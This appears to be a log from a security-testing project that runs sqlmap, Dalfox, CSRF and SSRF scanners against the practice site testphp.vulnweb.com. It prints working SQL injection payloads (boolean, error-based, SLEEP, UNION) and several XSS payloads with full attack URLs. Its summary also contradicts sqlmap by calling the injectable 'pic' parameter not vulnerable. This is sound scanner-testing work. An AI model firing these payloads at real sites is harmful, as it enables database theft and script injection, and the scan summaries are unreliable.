+2025-03-22 22:16:07,886 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:16:07,887 - INFO - root - 
+2025-03-22 22:16:07,887 - INFO - root - [*] starting @ 22:16:07 /2025-03-22/
+2025-03-22 22:16:07,888 - INFO - root - 
+2025-03-22 22:16:07,928 - INFO - root - [22:16:07] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:16:07,944 - INFO - root - [22:16:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Firefox/11.0' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:16:07,986 - INFO - root - [22:16:07] [INFO] testing connection to the target URL
+2025-03-22 22:16:08,683 - INFO - root - [22:16:08] [INFO] checking if the target is protected by some kind of WAF/IPS
+2025-03-22 22:16:09,220 - INFO - root - [22:16:09] [INFO] testing if the target URL content is stable
+2025-03-22 22:16:09,514 - INFO - root - [22:16:09] [INFO] target URL content is stable
+2025-03-22 22:16:09,515 - INFO - root - [22:16:09] [INFO] testing if GET parameter 'pic' is dynamic
+2025-03-22 22:16:09,923 - INFO - root - [22:16:09] [INFO] GET parameter 'pic' appears to be dynamic
+2025-03-22 22:16:10,304 - INFO - root - [22:16:10] [INFO] heuristic (basic) test shows that GET parameter 'pic' might be injectable (possible DBMS: 'MySQL')
+2025-03-22 22:16:10,694 - INFO - root - [22:16:10] [INFO] heuristic (XSS) test shows that GET parameter 'pic' might be vulnerable to cross-site scripting (XSS) attacks
+2025-03-22 22:16:10,696 - INFO - root - [22:16:10] [INFO] testing for SQL injection on GET parameter 'pic'
+2025-03-22 22:16:10,724 - INFO - root - [22:16:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+2025-03-22 22:16:11,129 - INFO - root - [22:16:11] [WARNING] reflective value(s) found and filtering out
+2025-03-22 22:16:12,685 - INFO - root - [22:16:12] [INFO] GET parameter 'pic' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="by")
+2025-03-22 22:16:12,685 - INFO - root - [22:16:12] [INFO] testing 'Generic inline queries'
+2025-03-22 22:16:13,058 - INFO - root - [22:16:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+2025-03-22 22:16:13,422 - INFO - root - [22:16:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+2025-03-22 22:16:13,781 - INFO - root - [22:16:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+2025-03-22 22:16:14,147 - INFO - root - [22:16:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+2025-03-22 22:16:14,525 - INFO - root - [22:16:14] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+2025-03-22 22:16:14,913 - INFO - root - [22:16:14] [INFO] GET parameter 'pic' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+2025-03-22 22:16:14,914 - INFO - root - [22:16:14] [INFO] testing 'MySQL inline queries'
+2025-03-22 22:16:15,278 - INFO - root - [22:16:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+2025-03-22 22:16:20,178 - INFO - root - [22:16:15] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+2025-03-22 22:16:20,538 - INFO - root - [22:16:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+2025-03-22 22:16:20,907 - INFO - root - [22:16:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+2025-03-22 22:16:21,467 - INFO - root - [22:16:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+2025-03-22 22:16:21,826 - INFO - root - [22:16:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+2025-03-22 22:16:22,187 - INFO - root - [22:16:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+2025-03-22 22:16:22,551 - INFO - root - [22:16:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+2025-03-22 22:16:33,644 - INFO - root - [22:16:33] [INFO] GET parameter 'pic' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+2025-03-22 22:16:33,646 - INFO - root - [22:16:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+2025-03-22 22:16:33,646 - INFO - root - [22:16:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+2025-03-22 22:16:34,376 - INFO - root - [22:16:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+2025-03-22 22:16:36,609 - INFO - root - [22:16:36] [INFO] target URL appears to have 11 columns in query
+2025-03-22 22:16:45,265 - INFO - root - [22:16:45] [INFO] GET parameter 'pic' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+2025-03-22 22:16:45,643 - INFO - root - sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
+2025-03-22 22:16:45,643 - INFO - root - ---
+2025-03-22 22:16:45,644 - INFO - root - Parameter: pic (GET)
+2025-03-22 22:16:45,644 - INFO - root - Type: boolean-based blind
+2025-03-22 22:16:45,644 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:16:45,645 - INFO - root - Payload: pic=1 AND 4383=4383
+2025-03-22 22:16:45,645 - INFO - root - 
+2025-03-22 22:16:45,645 - INFO - root - Type: error-based
+2025-03-22 22:16:45,646 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:16:45,646 - INFO - root - Payload: pic=1 AND GTID_SUBSET(CONCAT(0x7176627a71,(SELECT (ELT(2968=2968,1))),0x7170786b71),2968)
+2025-03-22 22:16:45,646 - INFO - root - 
+2025-03-22 22:16:45,646 - INFO - root - Type: time-based blind
+2025-03-22 22:16:45,648 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:16:45,648 - INFO - root - Payload: pic=1 AND (SELECT 3470 FROM (SELECT(SLEEP(5)))jBjc)
+2025-03-22 22:16:45,648 - INFO - root - 
+2025-03-22 22:16:45,649 - INFO - root - Type: UNION query
+2025-03-22 22:16:45,649 - INFO - root - Title: Generic UNION query (NULL) - 11 columns
+2025-03-22 22:16:45,649 - INFO - root - Payload: pic=-3852 UNION ALL SELECT NULL,NULL,CONCAT(0x7176627a71,0x52726f4573576b4a566e545a41506157554e5348624669775a554c7961777042716f445369416266,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+2025-03-22 22:16:45,650 - INFO - root - ---
+2025-03-22 22:16:45,650 - INFO - root - [22:16:45] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:16:47,835 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:16:47,836 - INFO - root - web application technology: PHP 5.6.40, Nginx 1.19.0
+2025-03-22 22:16:47,836 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:16:47,836 - INFO - root - [22:16:47] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:16:47,837 - INFO - root - 
+2025-03-22 22:16:47,837 - INFO - root - [*] ending @ 22:16:47 /2025-03-22/
+2025-03-22 22:16:47,837 - INFO - root - 
+2025-03-22 22:16:47,928 - INFO - security_api.sqlmap_test - 
+=== SQL Injection Scan Results ===
+2025-03-22 22:16:47,929 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:16:47,929 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:16:47,930 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:16:47,930 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:16:47,930 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:16:47,931 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:16:47,931 - INFO - security_api.sqlmap_test - 
+Target URL: http://testphp.vulnweb.com/product.php?pic=1
+2025-03-22 22:16:47,931 - INFO - security_api.sqlmap_test - Status: NOT VULNERABLE
+2025-03-22 22:16:47,932 - INFO - security_api.sqlmap_test - --------------------------------------------------
+2025-03-22 22:16:54,624 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:16:54,630 - INFO - security_api.dalfox_test - Starting Dalfox scan test...
+2025-03-22 22:16:54,631 - INFO - security_api.dalfox_scanner - Starting Dalfox scan with command: dalfox file tests\dalfox_results\urls_testphp.vulnweb.com_20250322_221654.txt -o tests\dalfox_results\dalfox_testphp.vulnweb.com_20250322_221654.txt --format json --silence --skip-bav --mass
+2025-03-22 22:17:37,895 - INFO - security_api.dalfox_scanner - Dalfox scan completed successfully
+2025-03-22 22:17:37,896 - INFO - security_api.dalfox_test - 
+=== XSS Scan Results ===
+2025-03-22 22:17:37,896 - INFO - security_api.dalfox_test - 
+Target URL: http://testphp.vulnweb.com/search.php?test=query%253C%252F%2573%2563%2572%2569%2570%2574%253E%253C%2573%2576%2567%253E%253C%2573%2563%2572%2569%2570%2574%252F%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%252D%2525%2532%2536%2561%2570%256F%2573%253B
+2025-03-22 22:17:37,897 - INFO - security_api.dalfox_test - Status: VULNERABLE
+2025-03-22 22:17:37,897 - INFO - security_api.dalfox_test - 
+Vulnerability Details:
+2025-03-22 22:17:37,898 - INFO - security_api.dalfox_test - Type: G
+2025-03-22 22:17:37,898 - INFO - security_api.dalfox_test - Severity: Low
+2025-03-22 22:17:37,898 - INFO - security_api.dalfox_test - CWE: 
+2025-03-22 22:17:37,899 - INFO - security_api.dalfox_test - 
+Proof of Concept:
+2025-03-22 22:17:37,900 - INFO - security_api.dalfox_test - Method: GET
+2025-03-22 22:17:37,900 - INFO - security_api.dalfox_test - Payload: </script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+2025-03-22 22:17:37,900 - INFO - security_api.dalfox_test - URL with payload: http://testphp.vulnweb.com/search.php?test=query%253C%252F%2573%2563%2572%2569%2570%2574%253E%253C%2573%2576%2567%253E%253C%2573%2563%2572%2569%2570%2574%252F%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%252D%2525%2532%2536%2561%2570%256F%2573%253B
+2025-03-22 22:17:37,900 - INFO - security_api.dalfox_test - 
+Recommendations:
+2025-03-22 22:17:37,901 - INFO - security_api.dalfox_test - --------------------------------------------------
+2025-03-22 22:17:37,901 - INFO - security_api.dalfox_test - 
+Target URL: http://testphp.vulnweb.com/search.php?test=query%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
+2025-03-22 22:17:37,901 - INFO - security_api.dalfox_test - Status: VULNERABLE
+2025-03-22 22:17:37,903 - INFO - security_api.dalfox_test - 
+Vulnerability Details:
+2025-03-22 22:17:37,903 - INFO - security_api.dalfox_test - Type: G
+2025-03-22 22:17:37,903 - INFO - security_api.dalfox_test - Severity: Low
+2025-03-22 22:17:37,903 - INFO - security_api.dalfox_test - CWE: 
+2025-03-22 22:17:37,904 - INFO - security_api.dalfox_test - 
+Proof of Concept:
+2025-03-22 22:17:37,904 - INFO - security_api.dalfox_test - Method: GET
+2025-03-22 22:17:37,905 - INFO - security_api.dalfox_test - Payload: "><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+2025-03-22 22:17:37,905 - INFO - security_api.dalfox_test - URL with payload: http://testphp.vulnweb.com/search.php?test=query%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
+2025-03-22 22:17:37,905 - INFO - security_api.dalfox_test - 
+Recommendations:
+2025-03-22 22:17:37,907 - INFO - security_api.dalfox_test - --------------------------------------------------
+2025-03-22 22:17:37,907 - INFO - security_api.dalfox_test - 
+Target URL: http://testphp.vulnweb.com/search.php?test=query%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+2025-03-22 22:17:37,908 - INFO - security_api.dalfox_test - Status: VULNERABLE
+2025-03-22 22:17:37,908 - INFO - security_api.dalfox_test - 
+Vulnerability Details:
+2025-03-22 22:17:37,908 - INFO - security_api.dalfox_test - Type: V
+2025-03-22 22:17:37,909 - INFO - security_api.dalfox_test - Severity: High
+2025-03-22 22:17:37,909 - INFO - security_api.dalfox_test - CWE: CWE-79
+2025-03-22 22:17:37,910 - INFO - security_api.dalfox_test - 
+Proof of Concept:
+2025-03-22 22:17:37,910 - INFO - security_api.dalfox_test - Method: GET
+2025-03-22 22:17:37,910 - INFO - security_api.dalfox_test - Payload: '"><img/src/onerror=.1|alert`` class=dalfox>
+2025-03-22 22:17:37,911 - INFO - security_api.dalfox_test - URL with payload: http://testphp.vulnweb.com/search.php?test=query%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+2025-03-22 22:17:37,911 - INFO - security_api.dalfox_test - 
+Recommendations:
+2025-03-22 22:17:37,912 - INFO - security_api.dalfox_test - 1. Implement proper input validation
+2025-03-22 22:17:37,912 - INFO - security_api.dalfox_test - 2. Use Content Security Policy (CSP) headers
+2025-03-22 22:17:37,913 - INFO - security_api.dalfox_test - 3. Encode special characters before output
+2025-03-22 22:17:37,913 - INFO - security_api.dalfox_test - 4. Consider using security frameworks or libraries
+2025-03-22 22:17:37,913 - INFO - security_api.dalfox_test - --------------------------------------------------
+2025-03-22 22:17:37,915 - INFO - security_api.dalfox_test - 
+Target URL: http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+2025-03-22 22:17:37,915 - INFO - security_api.dalfox_test - Status: VULNERABLE
+2025-03-22 22:17:37,915 - INFO - security_api.dalfox_test - 
+Vulnerability Details:
+2025-03-22 22:17:37,915 - INFO - security_api.dalfox_test - Type: V
+2025-03-22 22:17:37,916 - INFO - security_api.dalfox_test - Severity: High
+2025-03-22 22:17:37,916 - INFO - security_api.dalfox_test - CWE: CWE-79
+2025-03-22 22:17:37,917 - INFO - security_api.dalfox_test - 
+Proof of Concept:
+2025-03-22 22:17:37,917 - INFO - security_api.dalfox_test - Method: GET
+2025-03-22 22:17:37,917 - INFO - security_api.dalfox_test - Payload: '><img/src/onerror=.1|alert`` class=dalfox>
+2025-03-22 22:17:37,919 - INFO - security_api.dalfox_test - URL with payload: http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+2025-03-22 22:17:37,919 - INFO - security_api.dalfox_test - 
+Recommendations:
+2025-03-22 22:17:37,919 - INFO - security_api.dalfox_test - 1. Implement proper input validation
+2025-03-22 22:17:37,920 - INFO - security_api.dalfox_test - 2. Use Content Security Policy (CSP) headers
+2025-03-22 22:17:37,920 - INFO - security_api.dalfox_test - 3. Encode special characters before output
+2025-03-22 22:17:37,921 - INFO - security_api.dalfox_test - 4. Consider using security frameworks or libraries
+2025-03-22 22:17:37,921 - INFO - security_api.dalfox_test - --------------------------------------------------
+2025-03-22 22:23:13,400 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:23:13,405 - INFO - security_api.__main__ - Starting CSRF scan test...
+2025-03-22 22:23:13,405 - INFO - security_api.__main__ - 
+Scanning domain: http://testphp.vulnweb.com
+2025-03-22 22:23:13,406 - INFO - security_api.csrf_scanner - Starting CSRF scan for domain: http://testphp.vulnweb.com
+2025-03-22 22:23:14,600 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:23:14,601 - INFO - security_api.__main__ - 
+Vulnerable Form Found at: http://testphp.vulnweb.com/search.php?test=query
+2025-03-22 22:23:14,602 - INFO - security_api.__main__ - Method: post
+2025-03-22 22:23:14,602 - INFO - security_api.__main__ - Risk Level: High
+2025-03-22 22:23:14,603 - INFO - security_api.__main__ - 
+Missing Protections:
+2025-03-22 22:23:14,603 - INFO - security_api.__main__ - - CSRF Token
+2025-03-22 22:23:14,603 - INFO - security_api.__main__ - 
+Recommendations:
+2025-03-22 22:23:14,605 - INFO - security_api.__main__ - - Implement CSRF tokens in all forms
+2025-03-22 22:23:14,605 - INFO - security_api.__main__ - - Set SameSite=Strict for cookies
+2025-03-22 22:23:14,605 - INFO - security_api.__main__ - - Use secure session management
+2025-03-22 22:23:14,605 - INFO - security_api.__main__ - - Implement proper referrer checking
+2025-03-22 22:23:53,248 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:23:53,253 - INFO - security_api.__main__ - Starting SSRF scan test...
+2025-03-22 22:23:53,254 - INFO - security_api.__main__ - Starting SSRF scan for 3 URLs
+2025-03-22 22:23:53,254 - INFO - security_api.ssrf_scanner - Starting SSRF scan for 3 URLs
+2025-03-22 22:24:07,332 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:24:07,333 - INFO - security_api.__main__ - No SSRF vulnerabilities found.
